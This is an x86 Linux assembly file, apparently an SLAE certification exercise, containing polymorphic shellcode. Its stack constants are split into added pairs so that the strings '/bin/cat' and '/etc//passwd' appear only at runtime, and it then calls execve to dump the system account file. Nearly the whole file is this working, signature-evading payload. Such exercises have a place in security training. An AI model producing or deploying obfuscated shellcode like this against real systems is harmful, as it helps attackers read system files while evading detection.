;
;This code has been created for completing the requirements of the SecurityTube Linux Assembly Expertcertification:
;  	
;   http://securitytube-­training.com/online-courses/securitytube-linux-assembly-expert/  
;
;Student ID: SLAE-1537
;

global _start			

section .text
_start:

	xor eax,eax
	cdq


	; THE FISRT PARAMETER
	push edx

	;instead of push dword 0x7461632f
	mov esi, 0x43DB5FAB
	add esi, 0x30860384 
	push esi
	
	;instead of push dword 0x6e69622f
	mov dword [esp - 4], 0x59386a7f
	add dword [esp -4], 0x1530F7B0
	sub esp, 4
	mov ebx,esp



	; THE SECOND PARAMETER
	push edx
	;push dword 0x64777373
	push dword 0x184d95b3 
	add [esp], dword 0x4C29DDC0

	;instead of push dword 0x61702f2f
	push dword 0x5973f03a 
	add [esp], dword 0x7FC3EF5

	;instead of push dword 0x6374652f
	push dword 0x402a84b5 
	add [esp], dword 0x2349E07A

	mov ecx,esp



	;SYSCALL NUMBER
	mov al,0xb



	;PUSHING ALL THE PARAMETERS POINTERS INTO THE STACK
	push edx
	push ecx
	push ebx
	mov ecx,esp
	int 0x80





